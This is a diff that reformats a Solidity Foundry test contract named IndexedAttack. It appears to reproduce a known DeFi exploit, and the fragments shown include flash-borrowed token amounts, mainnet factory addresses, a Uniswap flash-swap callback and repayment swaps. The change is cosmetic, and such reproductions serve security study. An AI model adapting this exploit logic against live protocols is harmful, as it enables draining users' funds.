@@ -71,15 +71,15 @@ contract IndexedAttack is BNum, IUniswapV2Callee, Test {
         tokensBorrow[5] = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
 
         uint256[] memory amounts = new uint256[](6);
-        amounts[0] = 2000000 * 1e18;
-        amounts[1] = 200000 * 1e18;
-        amounts[2] = 41000 * 1e18;
-        amounts[3] = 3211000 * 1e18;
+        amounts[0] = 2_000_000 * 1e18;
+        amounts[1] = 200_000 * 1e18;
+        amounts[2] = 41_000 * 1e18;
+        amounts[3] = 3_211_000 * 1e18;
         amounts[4] = 5800 * 1e18;
-        amounts[5] = 453700 * 1e18;
+        amounts[5] = 453_700 * 1e18;
 
         address[] memory factories_ = new address[](6);
-        factories_[0] = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;        
+        factories_[0] = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
         factories_[1] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
         factories_[2] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
         factories_[3] = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
@@ -128,7 +128,12 @@ contract IndexedAttack is BNum, IUniswapV2Callee, Test {
         IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
     }
 
-    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external override {
+    function uniswapV2Call(
+        address _sender,
+        uint256 _amount0,
+        uint256 _amount1,
+        bytes calldata _data
+    ) external override {
         require(_sender == address(this), "!sender");
 
         (address tokenBorrow, uint256 amount, address factoryAddr) = abi.decode(_data, (address, uint256, address));
@@ -264,7 +269,9 @@ contract IndexedAttack is BNum, IUniswapV2Callee, Test {
         path[0] = MKR;
         path[1] = WETH;
         IERC20(MKR).approve(UNISWAP_ROUTER, type(uint256).max);
-        IUniswapV2Router01(UNISWAP_ROUTER).swapTokensForExactTokens(115 * 1e18, type(uint256).max, path, address(this), type(uint256).max);
+        IUniswapV2Router01(UNISWAP_ROUTER).swapTokensForExactTokens(
+            115 * 1e18, type(uint256).max, path, address(this), type(uint256).max
+        );
         IERC20(SUSHI).transfer(pair, IERC20(SUSHI).balanceOf(address(this)));
         IERC20(WETH).transfer(pair, 115 * 1e18); // estimated 115 based on trial and error
     }
